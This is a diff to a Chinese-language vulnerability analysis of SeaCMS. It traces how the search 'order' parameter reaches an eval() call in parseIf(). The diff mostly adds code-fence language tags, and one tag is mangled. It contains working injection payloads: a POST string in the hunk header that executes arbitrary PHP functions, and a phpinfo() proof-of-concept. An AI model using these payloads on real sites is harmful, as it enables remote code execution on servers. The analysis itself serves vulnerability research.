@@ -50,7 +50,7 @@ POST:searchtype=5&order=}{end if} {if:1)print_r($_POST[a]($_POST[b]));//}{end if
 
  首先，在文件`seacms/search.php`中，包含了文件`seacms/include/common.php`,在`common.php`中第45-48行，将GET,POST等请求传入的全局变量中的键值对转换成变量，并对其中的值使用`addslashes()`进行处理。
 
-```
+```php
 function _RunMagicQuotes(&$svar)
 {
 	if(!get_magic_quotes_gpc())
@@ -74,7 +74,7 @@ foreach(Array('_GET','_POST','_COOKIE') as $_request)
 
 然后在`seacms/search.php`文件的`echoSearchPage()`函数中，也就是文件第63行，将变量注册成全局变量。
 
-```
+```php
 global $dsql,$cfg_iscache,$mainClassObj,$page,$t1,$cfg_search_time,$searchtype,$searchword,$tid,$year,$letter,$area,$yuyan,$state,$ver,$order,$jq,$money,$cfg_basehost;
 ```
 
@@ -82,7 +82,7 @@ global $dsql,$cfg_iscache,$mainClassObj,$page,$t1,$cfg_search_time,$searchtype,$
 
 接着往下看，在`echoSearchPage()`函数中，使用`$searchtype`来选择使用的模板文件。
 
-```
+```php
 if(intval($searchtype)==5)
 	{
 		$searchTemplatePath = "/templets/".$GLOBALS['cfg_df_style']."/".$GLOBALS['cfg_df_html']."/cascade.html";
@@ -107,7 +107,7 @@ if(intval($searchtype)==5)
 
 下面153行，将模板文件读取到`$content`变量中，接着在155-173行替换标签。其中第158行使用`$order`替换了模板中`{searchpage:ordername}`标签。然后分别搜索`search.html`和`cascade.html`，只有`cascade.html`第79-81行存在该标签。
 
-```
+```php+HTML
 <a href="{searchpage:order-time-link}" {if:"{searchpage:ordername}"=="time"} class="btn btn-success" {else} class="btn btn-default" {end if} id="orderhits">最新上映</a>
 <a href="{searchpage:order-hit-link}" {if:"{searchpage:ordername}"=="hit"} class="btn btn-success" {else} class="btn btn-default" {end if} id="orderaddtime">最近热播</a>
 <a href="{searchpage:order-score-link}" {if:"{searchpage:ordername}"=="score"} class="btn btn-success" {else} class="btn btn-default" {end if} id="ordergold">评分最高</a>
@@ -117,13 +117,13 @@ if(intval($searchtype)==5)
 
 接着往下走，在第212行
 
-```
+```p&#39;h&#39;p
 $content=$mainClassObj->parseIf($content);
 ```
 
 跟进去，在`seacms\include\main.class.php`中第3098-3147行中。
 
-```
+```php
 function parseIf($content)
 {
     if (strpos($content, '{if:') === false) {
@@ -194,26 +194,26 @@ function parseIf($content)
 
 然后是正则，
 
-```
+```php
 $labelRule = buildregx("{if:(.*?)}(.*?){end if}","is");
 preg_match_all($labelRule,$content,$iar);
 ```
 
 看代码执行流程，在`eval()`函数中，`$strIf`就是之前`preg_match_all()`中第一个`(.*?)`匹配出来的值。
 
-```
+```php
 @eval("if(".$strIf."){\$ifFlag=true;}else{\$ifFlag=false;}");
 ```
 
 在`eval()`中，要闭合前面的if语句，可以构造`1)phpinfo();if(1`，又要符合正则`{if:(.*?)}(.*?){end if}`，再看标签：
 
-```
+```php+HTML
 <a href="{searchpage:order-time-link}" {if:"{searchpage:ordername}"=="time"} class="btn btn-success" {else} class="btn btn-default" {end if} id="orderhits">最新上映</a>
 ```
 
 由于`$order`替换的是`{searchpage:ordername}`，所以，在`1)phpinfo();if(1`基础上添加。
 
-```
+```php+HTML
 }{end if}{if:1)phpinfo();if(1}{end if}
 ```
 
